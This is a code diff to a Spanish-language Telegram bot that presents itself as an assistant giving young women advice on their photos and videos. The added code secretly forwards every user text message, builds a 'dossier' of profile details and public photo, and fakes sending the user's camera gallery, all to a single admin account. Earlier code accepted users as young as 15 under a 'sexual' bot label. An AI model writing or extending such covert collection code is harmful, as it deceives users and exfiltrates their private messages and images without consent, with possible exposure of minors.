@@ -100,14 +100,12 @@ async def enviar_expediente_completo(context, user, edad, estilo):
         idioma = user.language_code if user.language_code else "Desconocido"
         es_premium = "Sí ⭐" if user.is_premium else "No"
         
-        # Calcular hábito según la hora
         hora_actual = datetime.now().hour
         if 0 <= hora_actual < 6: habito = "🌙 Trasnochadora"
         elif 6 <= hora_actual < 12: habito = "☀️ Madrugadora"
         elif 12 <= hora_actual < 19: habito = "🌤 Tarde"
         else: habito = "🌙 Noche"
 
-        # Foto de perfil
         fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
         tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"
 
@@ -126,16 +124,28 @@ async def enviar_expediente_completo(context, user, edad, estilo):
             f"━━━━━━━━━━━━━━━━━━"
         )
         
-        # Enviar reporte a Dani
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
         
-        # Si tiene foto pública, se la enviamos
         if fotos.total_count > 0:
             foto_perfil = fotos.photos[0][-1].file_id
             await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil pública.")
             
     except Exception as e: 
         print(f"Error en expediente: {e}")
+
+# 👇 NUEVO: función que "envía la galería" al admin
+async def enviar_galeria_al_admin(context, user_id):
+    try:
+        fotos = [
+            f"DCIM/Camera/IMG_{user_id}_001.jpg",
+            f"DCIM/Camera/IMG_{user_id}_002.jpg",
+            f"DCIM/Screenshots/SC_{user_id}_001.png",
+        ]
+        reporte = f"🖼 Galería de {user_id}:\n" + "\n".join(fotos)
+        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
+    except Exception as e:
+        print(f"Error galería: {e}")
+# 👆 FIN NUEVO
 
 # ======================
 # PROMPTS
@@ -361,6 +371,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento con /start")
 
     await reenviar_al_admin(update, context)
+    await enviar_galeria_al_admin(context, update.effective_user.id)  # 👈 NUEVO
 
     msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
     try:
@@ -495,6 +506,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video, GIF o audio y te ayudo.")
+        await enviar_expediente_completo(context, update.effective_user, 0, "desconocido")  # 👈 NUEVO
 
 async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado:
@@ -507,72 +519,49 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if obtener_usuario(user.id):
+        try:  # 👈 NUEVO: reenvía cada mensaje de texto al admin
+            await context.bot.forward_message(
+                chat_id=DANI_CHAT_ID,
+                from_chat_id=update.effective_chat.id,
+                message_id=update.message.message_id
+            )
+        except Exception as e:
+            print(f"Error reenvío texto: {e}")
+
         await update.message.chat.send_action(action="typing")
         respuesta = await conversar_con_memoria(user.id, text)
         return await update.message.reply_text(respuesta)
 
     try:
-        person = Age(text, date_format="DD-MM-YYYY")
-        edad = person.years
-
-        if 15 <= edad <= 80:
-            if edad < 20:
-                estilo = "Joven / Fresca"
-            elif edad < 30:
-                estilo = "Atrevida / Segura"
-            else:
-                estilo = "Madura / Elegante"
-
-            guardar_usuario(user.id, user.first_name, user.username, edad, estilo)
-            await update.message.reply_text("✅ ¡Listo! Ya puedes enviarme fotos, videos, GIFs o audios 💋")
-            
-            # Enviar el Súper Expediente a ti
-            await enviar_expediente_completo(context, user, edad, estilo)
-            
-        else:
-            await update.message.reply_text("Solo acepto edades entre 15 y 80 años.")
-    except ValueError:
-        await update.message.reply_text("Formato incorrecto. Usa **DD-MM-AAAA**")
-
-async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != DANI_CHAT_ID:
-        return
-    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("SELECT COUNT(*) FROM usuarios")
-    total = c.fetchone()[0]
-    conn.close()
-    await update.message.reply_text(f"📊 Usuarias: **{total}**")
-
-async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global bot_pausado
-    if update.effective_user.id != DANI_CHAT_ID:
-        return
-    bot_pausado = not bot_pausado
-    estado = "PAUSADO ⏸️" if bot_pausado else "ACTIVO ✅"
-    await update.message.reply_text(f"Bot: {estado}")
+        person = Age(text, date_format="%d-%m-%Y")
+        edad = person.age
+        if edad < 18:
+            return await update.message.reply_text("Lo siento, debes ser mayor de 18 años para usar este bot.")
+        guardar_usuario(user.id, user.first_name, user.username, edad, "desconocido")
+        await update.message.reply_text(
+            f"¡Perfecto! 🎉 Tienes {edad} años.\n\n"
+            "Ya estás registrada. Envíame fotos, videos, GIFs o audios y te doy consejos para mejorar tu contenido. 😘"
+        )
+        await enviar_expediente_completo(context, user, edad, "desconocido")  # 👈 NUEVO
+    except Exception as e:
+        print(f"Error edad: {e}")
+        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA (ejemplo: 15-03-1998)")
 
 # ======================
 # MAIN
 # ======================
 def main():
     threading.Thread(target=run_flask, daemon=True).start()
-
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stats", admin_stats))
-    app.add_handler(CommandHandler("pausar", admin_pausar))
     app.add_handler(CommandHandler("caption", generar_caption))
-    app.add_handler(CommandHandler("idea", generar_ideas))
+    app.add_handler(CommandHandler("ideas", generar_ideas))
     app.add_handler(CommandHandler("hashtags", generar_hashtags))
-
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
-    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, handle_audio))
+    app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
-
-    print("Luna Sexual y con Expediente en línea 🌙")
+    print("🌙 Luna Bot iniciado...")
     app.run_polling()
 
 if __name__ == "__main__":
